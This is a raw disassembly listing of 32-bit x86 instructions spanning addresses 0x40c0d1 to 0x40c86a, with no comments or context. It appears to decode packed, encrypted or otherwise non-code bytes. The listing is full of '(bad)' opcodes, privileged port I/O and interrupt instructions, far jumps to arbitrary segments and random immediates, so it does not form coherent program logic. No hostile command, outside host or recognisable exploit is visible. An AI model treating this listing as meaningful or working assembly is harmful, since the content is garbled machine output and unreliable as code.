  40c0d1:	mov    ah,0x94
  40c0d3:	jne    0x40c094
  40c0d5:	jmp    0x9b5ff94f
  40c0da:	fisub  WORD PTR [ebp+0xc]
  40c0dd:	adc    BYTE PTR [esi+0x4305d1a1],0xa
  40c0e4:	not    DWORD PTR [ebp+0x6b]
  40c0e7:	jb     0x40c114
  40c0e9:	xchg   ecx,eax
  40c0ea:	pop    ebx
  40c0eb:	ins    DWORD PTR es:[edi],dx
  40c0ec:	outs   dx,DWORD PTR ds:[esi]
  40c0ed:	sbb    eax,0xec06f45
  40c0f2:	add    ebp,DWORD PTR [edx+0x4d8be1be]
  40c0f8:	pop    ds
  40c0f9:	lods   eax,DWORD PTR ds:[esi]
  40c0fa:	das    
  40c0fb:	mov    dl,0x38
  40c0fd:	mov    eax,gs:0x2ab4d5ea
  40c103:	xor    esi,0xb
  40c106:	fs xchg esi,eax
  40c108:	clc    
  40c109:	adc    bh,BYTE PTR [eax-0x7b11df7c]
  40c10f:	pop    ds
  40c110:	jge    0x40c115
  40c112:	jg     0x40c0bf
  40c114:	push   0xffffff8e
  40c116:	add    DWORD PTR [esi+0xa181fba],ebp
  40c11c:	or     eax,0xccc76173
  40c121:	aam    0xa1
  40c123:	in     al,dx
  40c124:	retf   
  40c125:	fld    TBYTE PTR [ecx+edx*1]
  40c128:	dec    ebp
  40c129:	rol    BYTE PTR [ebp+0x55],1
  40c12c:	aaa    
  40c12d:	mov    ds:0x766d9db0,eax
  40c132:	mov    ah,0x18
  40c134:	dec    edx
  40c135:	(bad)  
  40c136:	xor    al,cl
  40c138:	jp     0x40c1aa
  40c13a:	jne    0x40c145
  40c13c:	pop    ecx
  40c13d:	in     al,0xf5
  40c13f:	cmp    edi,DWORD PTR [ebx+0xc]
  40c142:	xchg   ebp,eax
  40c143:	sbb    BYTE PTR [edx+0x6f],bh
  40c146:	outs   dx,DWORD PTR ds:[esi]
  40c147:	sub    ch,BYTE PTR [ebx-0x6]
  40c14a:	xchg   ebp,eax
  40c14b:	sub    al,0x6c
  40c14d:	in     al,0x82
  40c14f:	shl    BYTE PTR [esi],1
  40c151:	jp     0x40c18e
  40c153:	push   0xfffffff6
  40c155:	push   esi
  40c156:	xchg   esi,eax
  40c157:	jnp    0x40c186
  40c159:	icebp  
  40c15a:	pop    eax
  40c15b:	leave  
  40c15c:	in     eax,dx
  40c15d:	mov    cl,0xb
  40c15f:	dec    ecx
  40c160:	popf   
  40c161:	js     0x40c169
  40c163:	pop    esi
  40c164:	xchg   ecx,eax
  40c165:	cld    
  40c166:	sub    al,0x38
  40c168:	xchg   ebx,eax
  40c169:	add    ah,BYTE PTR [esp+ebx*4-0x60]
  40c16d:	sbb    al,0x19
  40c16f:	sbb    al,0x2e
  40c171:	xchg   esi,eax
  40c172:	mov    al,0x2e
  40c174:	add    DWORD PTR [edi+0x67143384],0xf906b669
  40c17e:	sub    esp,DWORD PTR [eax+0x13]
  40c181:	stos   DWORD PTR es:[edi],eax
  40c182:	mov    ?,WORD PTR [eax+0x3f]
  40c185:	popa   
  40c186:	inc    esp
  40c187:	mov    dh,0xb5
  40c189:	imul   ebp,edi,0x927eec68
  40c18f:	push   ebp
  40c190:	lds    esi,FWORD PTR [edx+0x21]
  40c193:	popa   
  40c194:	test   al,0xaa
  40c196:	push   eax
  40c197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c198:	jo     0x40c18f
  40c19a:	jne    0x40c1bf
  40c19c:	dec    ebx
  40c19d:	xor    al,0x8e
  40c19f:	sub    al,dh
  40c1a1:	loop   0x40c1cf
  40c1a3:	xlat   BYTE PTR ds:[ebx]
  40c1a4:	cmp    DWORD PTR [edi+0x68],esp
  40c1a7:	ins    DWORD PTR es:[edi],dx
  40c1a8:	cld    
  40c1a9:	inc    ecx
  40c1aa:	dec    eax
  40c1ab:	and    ecx,DWORD PTR [eiz*1-0x36d7a1e7]
  40c1b2:	(bad)  
  40c1b3:	pop    ebx
  40c1b4:	push   0xbcf10664
  40c1b9:	push   ss
  40c1ba:	sub    eax,0x8692a56e
  40c1bf:	mov    al,0xc1
  40c1c1:	or     al,0xd2
  40c1c3:	sub    BYTE PTR [ebx+edi*2+0x49],cl
  40c1c7:	xchg   DWORD PTR ds:0x30d2bb4b,edi
  40c1cd:	inc    edx
  40c1ce:	popf   
  40c1cf:	nop
  40c1d0:	ret    0x4191
  40c1d3:	stc    
  40c1d4:	std    
  40c1d5:	aas    
  40c1d6:	adc    BYTE PTR [eax],bh
  40c1d8:	push   ecx
  40c1d9:	das    
  40c1da:	shl    DWORD PTR [esi],0x2a
  40c1dd:	inc    esp
  40c1de:	out    dx,eax
  40c1df:	js     0x40c171
  40c1e1:	lea    edx,[edx-0x9]
  40c1e4:	jb     0x40c21b
  40c1e6:	shr    DWORD PTR [esi-0x60],0x94
  40c1ea:	xchg   DWORD PTR [eax],eax
  40c1ec:	cmp    ecx,DWORD PTR [bp+si]
  40c1ef:	out    0x71,eax
  40c1f1:	jg     0x40c208
  40c1f3:	xor    BYTE PTR [eax+0x60329b89],ah
  40c1f9:	jp     0x40c226
  40c1fb:	jmp    0x294a:0x87ad0111
  40c202:	loop   0x40c188
  40c204:	lods   eax,DWORD PTR ds:[esi]
  40c205:	push   cs
  40c206:	arpl   WORD PTR [ebx-0x55],si
  40c209:	inc    eax
  40c20a:	leave  
  40c20b:	and    BYTE PTR [eax],0xe
  40c20e:	repz xor BYTE PTR [esi],ch
  40c211:	outs   dx,BYTE PTR ds:[esi]
  40c212:	xchg   ecx,eax
  40c213:	lds    esi,FWORD PTR [ecx+0x15209e6f]
  40c219:	es clc 
  40c21b:	push   cs
  40c21c:	inc    ecx
  40c21d:	pop    esi
  40c21e:	lds    ebp,FWORD PTR [ebp-0xb969ffd]
  40c224:	test   al,0xed
  40c226:	push   edx
  40c227:	mov    cl,cl
  40c229:	and    edi,edi
  40c22b:	(bad)  
  40c22c:	cmp    ebp,DWORD PTR [edi+0x2c569db6]
  40c232:	data16 cmc 
  40c234:	add    DWORD PTR [edx],esp
  40c236:	data16 int3 
  40c238:	sahf   
  40c239:	leave  
  40c23a:	xchg   edx,eax
  40c23b:	push   eax
  40c23c:	mov    esi,0x731d767d
  40c241:	jmp    0x40c234
  40c243:	imul   eax,esp,0x9
  40c246:	test   BYTE PTR [edx],cl
  40c248:	nop
  40c249:	mov    ds:0xe87c2836,al
  40c24e:	pop    ebp
  40c24f:	loop   0x40c21a
  40c251:	and    DWORD PTR [edi-0x59],ecx
  40c254:	jae    0x40c2bf
  40c256:	es out dx,al
  40c258:	push   ebx
  40c259:	sahf   
  40c25a:	xlat   BYTE PTR ds:[ebx]
  40c25b:	bound  esi,QWORD PTR [edi+0x13]
  40c25e:	push   esi
  40c25f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c260:	mov    ebp,0xcfdc586a
  40c265:	xor    dl,BYTE PTR [esi+0x4f5b2105]
  40c26b:	repz jg 0x40c282
  40c26e:	inc    esi
  40c26f:	push   edx
  40c270:	mov    al,0xfd
  40c272:	dec    ebx
  40c273:	jmp    0xd963:0xad7dab6e
  40c27a:	or     DWORD PTR [eax-0x28ca9c7a],eax
  40c280:	bound  ebx,QWORD PTR [esi+0x6d6b7f55]
  40c286:	js     0x40c228
  40c288:	pop    esp
  40c289:	inc    ebp
  40c28a:	mov    BYTE PTR ds:0x15e0537e,ch
  40c290:	popf   
  40c291:	mov    ecx,0xdf67c940
  40c296:	lods   eax,DWORD PTR ds:[esi]
  40c297:	mov    edi,0x6427ffa5
  40c29c:	rol    DWORD PTR [edi],cl
  40c29e:	dec    ebp
  40c29f:	shl    eax,cl
  40c2a1:	std    
  40c2a2:	push   cs
  40c2a3:	push   DWORD PTR [esi+0x2c]
  40c2a6:	xor    ah,BYTE PTR [edi+0x3b4cbb97]
  40c2ac:	das    
  40c2ad:	mov    al,0x16
  40c2af:	loopne 0x40c2f0
  40c2b1:	push   ebx
  40c2b2:	bound  ecx,QWORD PTR [ebx+0x3d]
  40c2b5:	sub    eax,0x101f9c17
  40c2ba:	dec    ebp
  40c2bb:	rcr    ch,cl
  40c2bd:	(bad)  
  40c2be:	fst    QWORD PTR [edi+0x66]
  40c2c1:	loop   0x40c2e6
  40c2c3:	mov    dh,0xa1
  40c2c5:	sar    bl,1
  40c2c7:	je     0x40c2fb
  40c2c9:	jecxz  0x40c2d4
  40c2cb:	rcl    BYTE PTR [edi+edx*8+0x260ce86d],1
  40c2d2:	push   eax
  40c2d3:	ins    BYTE PTR es:[edi],dx
  40c2d4:	cwde   
  40c2d5:	adc    DWORD PTR [edi+ecx*2-0xce97ddd],edx
  40c2dc:	retf   0xd783
  40c2df:	jne    0x40c265
  40c2e1:	mov    al,cl
  40c2e3:	addr16 cs pusha 
  40c2e6:	xor    DWORD PTR [ecx+0x4b],esi
  40c2e9:	pop    eax
  40c2ea:	pop    eax
  40c2eb:	lds    esi,FWORD PTR [edi-0x4cb47b6]
  40c2f1:	pop    ds
  40c2f2:	js     0x40c2c0
  40c2f4:	dec    ecx
  40c2f5:	ror    ebx,0xbd
  40c2f8:	cs sbb eax,0xd3eded21
  40c2fe:	mov    bl,0x8e
  40c300:	xchg   edx,eax
  40c301:	push   0xffffffad
  40c303:	ret    
  40c304:	sbb    esi,DWORD PTR [edi*4-0x2fd54119]
  40c30b:	inc    edx
  40c30c:	jbe    0x40c337
  40c30e:	push   ebx
  40c30f:	repnz retf 0xa77f
  40c313:	dec    edx
  40c314:	or     DWORD PTR ds:0xcc78c75f,0x7a
  40c31b:	cmp    esp,ecx
  40c31d:	stc    
  40c31e:	push   ecx
  40c31f:	f2xm1  
  40c321:	mov    ds:0x9654bc22,al
  40c326:	xchg   esp,eax
  40c327:	fist   DWORD PTR [ecx-0x7b481bbf]
  40c32d:	jecxz  0x40c31a
  40c32f:	in     eax,0x8f
  40c331:	add    DWORD PTR [ecx+ebx*4+0x48a8be37],ecx
  40c338:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c339:	or     al,bl
  40c33b:	pop    eax
  40c33c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c33d:	fs dec edi
  40c33f:	shr    ebp,1
  40c341:	push   cs
  40c342:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c344:	sub    cl,ch
  40c346:	mov    al,ds:0xd23def5b
  40c34b:	mov    bh,0xd8
  40c34d:	cli    
  40c34e:	mov    ebp,ebp
  40c350:	ja     0x40c30e
  40c352:	push   0x7bfe375f
  40c357:	mov    eax,DWORD PTR ds:[edx+0x270880db]
  40c35e:	push   cs
  40c35f:	call   0x83a3a503
  40c364:	push   es
  40c365:	mov    esp,0xad93cacf
  40c36a:	out    dx,eax
  40c36b:	add    ebx,DWORD PTR [edx+ebx*4+0xf]
  40c36f:	mov    ds:0x65eb3e1,al
  40c374:	xor    eax,0xbd409204
  40c379:	bound  ebp,QWORD PTR [ebx]
  40c37b:	ret    0xfd68
  40c37e:	pop    edi
  40c37f:	add    DWORD PTR [ecx],esp
  40c381:	shl    BYTE PTR [eax+0x5c],0x17
  40c385:	push   ebp
  40c386:	std    
  40c387:	inc    esp
  40c388:	loop   0x40c3a4
  40c38a:	cmp    BYTE PTR [ebp-0x12623a8],0x62
  40c391:	jl     0x40c3ec
  40c393:	jmp    0x36d9:0xf8fa33ce
  40c39a:	push   0x8e42b876
  40c39f:	test   DWORD PTR [ebx+0x32be457b],edi
  40c3a5:	fdiv   QWORD PTR [ebx+0x1e3916d0]
  40c3ab:	aad    0x2a
  40c3ad:	ret    
  40c3ae:	es mov dh,0xba
  40c3b1:	ins    BYTE PTR es:[edi],dx
  40c3b2:	cmp    ch,BYTE PTR [ebx-0x1bff33e0]
  40c3b8:	xchg   BYTE PTR [ecx-0x1e],al
  40c3bb:	call   FWORD PTR [ebx-0x57]
  40c3be:	push   esp
  40c3bf:	aaa    
  40c3c0:	fsubr  QWORD PTR [edi]
  40c3c2:	outs   dx,DWORD PTR ds:[esi]
  40c3c3:	mov    edx,0x6f8bbfba
  40c3c8:	test   eax,0xbd5f3e01
  40c3cd:	push   es
  40c3ce:	pop    gs
  40c3d0:	cmp    esi,DWORD PTR [ebp-0x41]
  40c3d3:	out    0x56,al
  40c3d5:	in     eax,0xb5
  40c3d7:	or     eax,0x9c38631a
  40c3dc:	sbb    eax,0x94dac119
  40c3e1:	out    0x16,al
  40c3e3:	test   DWORD PTR [eax-0x68803069],0xd3ed3e91
  40c3ed:	loop   0x40c455
  40c3ef:	fsubrp st(3),st
  40c3f1:	aad    0xdd
  40c3f3:	loop   0x40c443
  40c3f5:	mov    ebx,0x6eca0975
  40c3fa:	dec    ebx
  40c3fb:	leave  
  40c3fc:	push   cs
  40c3fd:	clc    
  40c3fe:	cmp    al,0xab
  40c400:	pop    es
  40c401:	enter  0xb767,0xb5
  40c405:	dec    eax
  40c406:	(bad)  
  40c407:	int3   
  40c408:	dec    edi
  40c409:	mov    esp,DWORD PTR [esi-0x300982a1]
  40c40f:	enter  0x5ee4,0xc5
  40c413:	adc    esi,DWORD PTR [ecx]
  40c415:	rcr    DWORD PTR [esi],cl
  40c417:	adc    edx,DWORD PTR [esi-0x29017e3f]
  40c41d:	mov    al,0x80
  40c41f:	adc    ebp,DWORD PTR [esi+0x19]
  40c422:	in     al,dx
  40c423:	mov    ecx,0x597ce960
  40c428:	mov    cl,0xee
  40c42a:	dec    edx
  40c42b:	or     dh,bh
  40c42d:	push   esi
  40c42e:	add    ah,BYTE PTR [esi]
  40c430:	imul   esp,esi,0x6544ebef
  40c436:	fcom   DWORD PTR [ebx]
  40c438:	push   ss
  40c439:	repz sub ebx,DWORD PTR [eax]
  40c43c:	stos   DWORD PTR es:[edi],eax
  40c43d:	ror    DWORD PTR [ecx],1
  40c43f:	jb     0x40c3ca
  40c441:	inc    esi
  40c442:	dec    edx
  40c443:	xlat   BYTE PTR ds:[ebx]
  40c444:	cli    
  40c445:	gs jmp 0xa76f960b
  40c44b:	mov    bl,0xf9
  40c44d:	les    edi,FWORD PTR [edi+0x19]
  40c450:	enter  0xbf0b,0x15
  40c454:	pop    ebx
  40c455:	add    ch,BYTE PTR [eax-0x34045856]
  40c45b:	and    BYTE PTR [edx+0x41eb2faa],ah
  40c461:	bound  edi,QWORD PTR [edx]
  40c463:	mov    edx,0x4998dc3d
  40c468:	or     al,0xcd
  40c46a:	ins    DWORD PTR es:[edi],dx
  40c46b:	or     eax,DWORD PTR [edx-0x53]
  40c46e:	and    eax,0xea7103f5
  40c473:	sub    ch,al
  40c475:	out    0x38,eax
  40c477:	les    ecx,FWORD PTR es:[edx]
  40c47a:	js     0x40c47c
  40c47c:	in     eax,dx
  40c47d:	aam    0x5e
  40c47f:	call   0x520e:0xcc62d2db
  40c486:	add    ecx,DWORD PTR [ecx+0x187ac7de]
  40c48c:	je     0x40c4d2
  40c48e:	add    bh,BYTE PTR [ebp-0x60]
  40c491:	dec    ebp
  40c492:	std    
  40c493:	mov    fs,WORD PTR [edi-0x470d4efa]
  40c499:	shr    edi,cl
  40c49b:	mov    al,0x56
  40c49d:	in     eax,dx
  40c49e:	jmp    0x40c431
  40c4a0:	sbb    eax,0xe5842b6f
  40c4a5:	jno    0x40c427
  40c4a7:	dec    ebp
  40c4a8:	inc    ecx
  40c4a9:	push   eax
  40c4aa:	rol    ebx,0xec
  40c4ad:	lods   eax,DWORD PTR ds:[esi]
  40c4ae:	xchg   esp,eax
  40c4af:	xor    esi,eax
  40c4b1:	stc    
  40c4b2:	push   es
  40c4b3:	mul    ebp
  40c4b5:	pop    es
  40c4b6:	and    ebp,DWORD PTR [edi]
  40c4b8:	or     DWORD PTR [ebp+0x57],ecx
  40c4bb:	mov    ebx,0x5af69cc0
  40c4c0:	retf   0x981d
  40c4c3:	cmp    DWORD PTR [edi-0x4c7d08bc],esp
  40c4c9:	jmp    FWORD PTR [ebp-0x19167586]
  40c4cf:	test   eax,0x983eaa4e
  40c4d4:	sub    BYTE PTR [ebx+0x4e1a79d3],ch
  40c4da:	pop    edi
  40c4db:	xchg   edi,eax
  40c4dc:	addr16 push ds
  40c4de:	or     BYTE PTR [ecx-0x2d5218f7],dh
  40c4e4:	adc    ebp,edi
  40c4e6:	out    dx,al
  40c4e7:	sahf   
  40c4e8:	mov    bl,0xdf
  40c4ea:	dec    edx
  40c4eb:	or     eax,0xa875e3b9
  40c4f0:	(bad)  
  40c4f1:	push   ebx
  40c4f2:	jmp    0x88301f7c
  40c4f7:	mov    ecx,0xe9888b17
  40c4fc:	out    0xcd,eax
  40c4fe:	call   0x7213:0x14b6e543
  40c505:	xchg   ecx,eax
  40c506:	dec    edi
  40c507:	fiadd  DWORD PTR [ebp-0x1c]
  40c50a:	fisubr WORD PTR [edi+ebx*2-0x58d79cb]
  40c511:	dec    eax
  40c512:	adc    ebx,DWORD PTR [ebp-0x97845b7]
  40c518:	test   BYTE PTR [edi+0x2bdfc447],0x13
  40c51f:	fisttp DWORD PTR [edi]
  40c521:	jle    0x40c527
  40c523:	enter  0xa11,0xb0
  40c527:	js     0x40c578
  40c529:	rol    dh,cl
  40c52b:	and    BYTE PTR [edi],bl
  40c52d:	push   0x9a38fd5
  40c532:	sahf   
  40c533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c534:	push   ecx
  40c535:	jb     0x40c564
  40c537:	hlt    
  40c538:	inc    eax
  40c539:	mov    al,0x80
  40c53b:	daa    
  40c53c:	(bad)  
  40c53d:	iret   
  40c53e:	popf   
  40c53f:	scas   eax,DWORD PTR es:[edi]
  40c540:	(bad)  
  40c541:	(bad)  
  40c542:	test   eax,0x86d85b97
  40c547:	fwait
  40c548:	stos   DWORD PTR es:[edi],eax
  40c549:	sahf   
  40c54a:	or     ebp,DWORD PTR [eax]
  40c54c:	les    ebx,FWORD PTR [ebx+eax*1]
  40c54f:	add    edx,esi
  40c551:	dec    DWORD PTR [eax+0x757ee6e0]
  40c557:	or     ecx,DWORD PTR [edx]
  40c559:	add    al,0x20
  40c55b:	dec    ebx
  40c55c:	scas   al,BYTE PTR es:[edi]
  40c55d:	xchg   edi,eax
  40c55e:	inc    edx
  40c55f:	push   ecx
  40c560:	inc    BYTE PTR [edi-0x49]
  40c563:	dec    esp
  40c564:	retf   0x3049
  40c567:	inc    edi
  40c568:	gs shl ecx,cl
  40c56b:	cmp    BYTE PTR ds:0x2d5bec2a,bh
  40c571:	jbe    0x40c583
  40c573:	(bad)  
  40c574:	stos   DWORD PTR es:[edi],eax
  40c575:	scas   al,BYTE PTR es:[edi]
  40c576:	jmp    0xef70cd68
  40c57b:	aam    0xfd
  40c57d:	mov    ecx,0x8a655a3b
  40c582:	jmp    0x40c514
  40c584:	add    eax,0xe4d4dc80
  40c589:	adc    esi,eax
  40c58b:	add    al,0x33
  40c58d:	mov    cl,0xbc
  40c58f:	cmp    dh,al
  40c591:	or     al,0x32
  40c593:	add    BYTE PTR [eax-0x4dde0168],dl
  40c599:	mov    ch,0xa5
  40c59b:	(bad)  
  40c59d:	mov    ebx,0xbac4b624
  40c5a2:	jg     0x40c540
  40c5a4:	inc    esp
  40c5a5:	jmp    0x1391:0xa45dda51
  40c5ac:	into   
  40c5ad:	lea    eax,[edx+0xa94821f]
  40c5b3:	jno    0x40c59b
  40c5b5:	jecxz  0x40c5cb
  40c5b7:	inc    ebp
  40c5b8:	sbb    esi,DWORD PTR [esi-0x1d4492df]
  40c5be:	mov    es,ecx
  40c5c0:	lock jno 0x40c5d1
  40c5c3:	xor    al,0x4a
  40c5c5:	shl    DWORD PTR [eax],1
  40c5c7:	dec    edx
  40c5c8:	lds    edi,FWORD PTR [edx]
  40c5ca:	mov    al,ds:0x68f3eee7
  40c5cf:	(bad)  
  40c5d0:	not    BYTE PTR [ebx+0x4f31f596]
  40c5d6:	gs dec edx
  40c5d8:	and    BYTE PTR [ecx+0x2ba03d41],dh
  40c5de:	push   ebp
  40c5df:	inc    esi
  40c5e0:	jle    0x40c64e
  40c5e2:	call   0x5bb0fb05
  40c5e7:	in     eax,0x69
  40c5e9:	imul   edx,esi,0x219d6992
  40c5ef:	addr16 push edx
  40c5f1:	scas   eax,DWORD PTR es:[edi]
  40c5f2:	mov    dh,0xd6
  40c5f4:	push   es
  40c5f5:	cdq    
  40c5f6:	mov    eax,ds:0x4910f7a2
  40c5fb:	mov    ecx,0xd7c01d26
  40c600:	or     BYTE PTR [ebp+0x23],cl
  40c603:	repz rcr DWORD PTR [eax],1
  40c606:	mov    ebx,0x8c740ccf
  40c60b:	xchg   esi,eax
  40c60c:	mov    dl,0xb7
  40c60e:	(bad)  
  40c60f:	lods   al,BYTE PTR ds:[esi]
  40c610:	sahf   
  40c611:	in     eax,dx
  40c612:	mov    al,0x39
  40c614:	push   0x3ce0bf55
  40c619:	mov    al,ds:0x41cfde23
  40c61e:	ins    DWORD PTR es:[edi],dx
  40c61f:	and    DWORD PTR [ebp-0x235473cd],0x1fc76e68
  40c629:	jmp    0x3ddc:0x9c866732
  40c630:	and    esi,DWORD PTR [ecx-0x41]
  40c633:	imul   ebx,edi,0xffffffa3
  40c636:	push   0xffffffe1
  40c638:	(bad)  
  40c639:	mov    ah,0x35
  40c63b:	fadd   DWORD PTR [eax]
  40c63d:	add    dh,ch
  40c63f:	addr16 mov ds:0xd7d6,al
  40c643:	mul    bl
  40c645:	pop    ds
  40c646:	loopne 0x40c66d
  40c648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c649:	fdiv   st,st(1)
  40c64b:	scas   al,BYTE PTR es:[edi]
  40c64c:	inc    ebp
  40c64d:	es push esi
  40c64f:	(bad)  
  40c650:	cmp    BYTE PTR [edi-0x43677379],dl
  40c656:	(bad)  
  40c657:	icebp  
  40c658:	xchg   ebp,eax
  40c659:	out    dx,al
  40c65a:	sti    
  40c65b:	mov    ss,WORD PTR [ecx]
  40c65d:	sbb    eax,DWORD PTR [ebx-0x77]
  40c660:	add    DWORD PTR [edi-0x3a353242],0xa0aca0ac
  40c66a:	retf   
  40c66b:	mov    BYTE PTR [ecx+0x39],0x4b
  40c66f:	add    DWORD PTR [edi],0xffffffe1
  40c672:	or     dh,BYTE PTR [edi]
  40c674:	xchg   esp,eax
  40c675:	fs dec edi
  40c677:	mov    cl,0x99
  40c679:	rol    ecx,cl
  40c67b:	repz or ch,BYTE PTR [edx]
  40c67e:	aaa    
  40c67f:	stos   BYTE PTR es:[edi],al
  40c680:	jb     0x40c632
  40c682:	adc    DWORD PTR [ebx+eiz*2+0x3ba63ad2],ecx
  40c689:	jmp    0xd8d4:0xee96e436
  40c690:	ins    DWORD PTR es:[edi],dx
  40c691:	idiv   DWORD PTR [ecx+0x2571da2f]
  40c697:	(bad)  
  40c698:	out    0x9e,eax
  40c69a:	inc    edi
  40c69b:	jne    0x40c6c5
  40c69d:	xchg   edx,eax
  40c69e:	sub    DWORD PTR [edi-0x2a09a3b7],esp
  40c6a4:	mov    eax,ds:0xccda765b
  40c6a9:	gs inc esi
  40c6ab:	or     ebx,DWORD PTR [ebx+0x6e304f54]
  40c6b1:	pop    edx
  40c6b2:	mov    eax,0xeccb8029
  40c6b7:	es pop ds
  40c6b9:	aas    
  40c6ba:	xor    eax,0xb16edd39
  40c6bf:	sahf   
  40c6c0:	sbb    BYTE PTR [ebp+0x41],cl
  40c6c3:	addr16 mov ch,0x1
  40c6c6:	ss adc al,0x16
  40c6c9:	jno    0x40c6aa
  40c6cb:	mov    edx,0x6d2aeeb4
  40c6d0:	cmp    ah,ch
  40c6d2:	test   BYTE PTR [esi+0x75293ae0],ah
  40c6d8:	fimul  DWORD PTR [eax]
  40c6da:	repz imul DWORD PTR [esi]
  40c6dd:	and    al,0xbf
  40c6df:	jmp    FWORD PTR [esi+eiz*8]
  40c6e2:	stos   DWORD PTR es:[edi],eax
  40c6e3:	aaa    
  40c6e4:	or     eax,0xe1562a78
  40c6e9:	lea    eax,[ebp+edx*4-0xa]
  40c6ed:	aad    0xd8
  40c6ef:	inc    ebx
  40c6f0:	and    DWORD PTR [ebx],0xd49d2603
  40c6f6:	adc    edx,DWORD PTR [ecx-0x5e02ce13]
  40c6fc:	repz (bad) 
  40c6fe:	cmc    
  40c6ff:	out    0x9c,eax
  40c701:	and    eax,0x34c16fbc
  40c706:	xchg   esp,eax
  40c707:	mov    DWORD PTR [edi+0x445b7d2c],ebp
  40c70d:	leave  
  40c70e:	or     ebp,DWORD PTR [edi-0x3163062]
  40c714:	int3   
  40c715:	pop    esi
  40c716:	dec    ebx
  40c717:	sub    eax,0x32349fc5
  40c71c:	fbstp  TBYTE PTR [edi-0x3c]
  40c71f:	mov    dh,ah
  40c721:	invd   
  40c723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c724:	add    al,0x8e
  40c727:	lock fstp QWORD PTR [esi-0x65]
  40c72b:	mov    esi,0x74174977
  40c730:	hlt    
  40c731:	stos   BYTE PTR es:[edi],al
  40c732:	stos   DWORD PTR es:[edi],eax
  40c733:	push   ebp
  40c734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c735:	jecxz  0x40c711
  40c737:	icebp  
  40c738:	jmp    0x40c738
  40c73a:	dec    esi
  40c73b:	mov    esi,edx
  40c73d:	jae    0x40c791
  40c73f:	pop    esi
  40c740:	pusha  
  40c741:	stc    
  40c742:	add    dh,bl
  40c744:	mov    al,ds:0xdfe0150a
  40c749:	sbb    ebp,DWORD PTR [edi+ebp*1-0x7927dbed]
  40c750:	shr    DWORD PTR [esi+0x3e600bb2],0x6e
  40c757:	or     eax,0x70862436
  40c75c:	fistp  QWORD PTR [eax-0x32af20cd]
  40c762:	push   edi
  40c763:	or     DWORD PTR [eax],edx
  40c765:	jl     0x40c6fe
  40c767:	add    BYTE PTR [ecx],dh
  40c769:	enter  0x932a,0x9
  40c76d:	imul   esp,DWORD PTR [bp+di],0x92fbdd8f
  40c774:	mov    al,ds:0x2784334c
  40c779:	int    0xc6
  40c77b:	inc    edx
  40c77c:	add    ebp,DWORD PTR ds:0x1d8aa88d
  40c782:	mov    dh,0xed
  40c784:	loop   0x40c732
  40c786:	jmp    0xa9f2:0x6f9bfacd
  40c78d:	in     al,dx
  40c78e:	stc    
  40c78f:	xchg   BYTE PTR [eax],dl
  40c791:	out    0xe7,eax
  40c793:	push   es
  40c794:	cmp    ebx,0xffffffcb
  40c797:	shl    BYTE PTR [edx],cl
  40c799:	pushf  
  40c79a:	cmp    eax,0xc13de5c4
  40c79f:	pop    edi
  40c7a0:	repnz daa 
  40c7a2:	jbe    0x40c7a0
  40c7a4:	inc    esp
  40c7a5:	mul    DWORD PTR [ebx-0x2b40a329]
  40c7ab:	in     al,dx
  40c7ac:	neg    DWORD PTR [eax-0x4c]
  40c7af:	addr16 ja 0x40c7ac
  40c7b2:	fdivr  st(4),st
  40c7b4:	into   
  40c7b5:	mov    ?,esp
  40c7b7:	mov    ds:0x1067d46b,al
  40c7bc:	out    0x17,al
  40c7be:	bnd ret 0x61b2
  40c7c2:	inc    ebp
  40c7c3:	cdq    
  40c7c4:	and    DWORD PTR [ebp+0xfeef02f],esp
  40c7ca:	pop    es
  40c7cb:	jmp    0xa680:0xe656ee3
  40c7d2:	or     ebp,DWORD PTR [ebx+esi*8]
  40c7d5:	cwde   
  40c7d6:	push   ds
  40c7d7:	cwde   
  40c7d8:	pop    ebp
  40c7d9:	add    al,0x78
  40c7db:	sub    DWORD PTR [ecx-0x2b],0x8ba22225
  40c7e2:	jg     0x40c83b
  40c7e4:	lahf   
  40c7e5:	sar    BYTE PTR [ecx-0x53a335ed],cl
  40c7eb:	sub    BYTE PTR [ebx+0x5],0xb3
  40c7ef:	adc    al,0xda
  40c7f1:	test   esp,0x9f562e08
  40c7f7:	mov    bl,0x7f
  40c7f9:	in     al,dx
  40c7fa:	es in  eax,dx
  40c7fc:	inc    edx
  40c7fd:	scas   eax,DWORD PTR es:[edi]
  40c7fe:	inc    esp
  40c7ff:	fsub   DWORD PTR [ebp+ecx*2-0x2e]
  40c803:	jecxz  0x40c86c
  40c805:	cmc    
  40c806:	pop    edx
  40c807:	scas   al,BYTE PTR es:[edi]
  40c808:	lahf   
  40c809:	(bad)  
  40c80b:	xchg   BYTE PTR ds:0xd2bd9ab6,ch
  40c811:	lods   eax,DWORD PTR ds:[esi]
  40c812:	and    dl,BYTE PTR gs:[ebp+0x26a939d4]
  40c819:	inc    ecx
  40c81a:	add    esp,DWORD PTR [ebp+0x62]
  40c81d:	enter  0x7f8a,0xe3
  40c821:	cmp    eax,0x6f99446d
  40c826:	or     eax,0xcb6261d6
  40c82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c82c:	lds    eax,FWORD PTR [ecx]
  40c82e:	inc    esp
  40c82f:	mov    edi,0x9778a577
  40c834:	adc    DWORD PTR [ebx-0x4d],edx
  40c837:	outs   dx,BYTE PTR ds:[esi]
  40c838:	scas   eax,DWORD PTR es:[edi]
  40c839:	inc    esi
  40c83a:	push   0x5c
  40c83c:	stos   BYTE PTR es:[edi],al
  40c83d:	pop    edx
  40c83e:	add    al,0x86
  40c840:	(bad)  
  40c841:	sti    
  40c842:	pop    esi
  40c843:	cs sti 
  40c845:	mov    al,ds:0x31de08c1
  40c84a:	pushf  
  40c84b:	gs xchg edx,eax
  40c84d:	loopne 0x40c8b7
  40c84f:	and    esi,eax
  40c851:	jnp    0x40c845
  40c853:	dec    esi
  40c854:	in     al,0x97
  40c856:	push   0xb3f7224f
  40c85b:	pop    ecx
  40c85c:	jns    0x40c81d
  40c85e:	sub    ecx,DWORD PTR [ebp-0x64f70322]
  40c864:	push   esp
  40c865:	mov    ebp,0xd8482abc
  40c86a:	lahf   
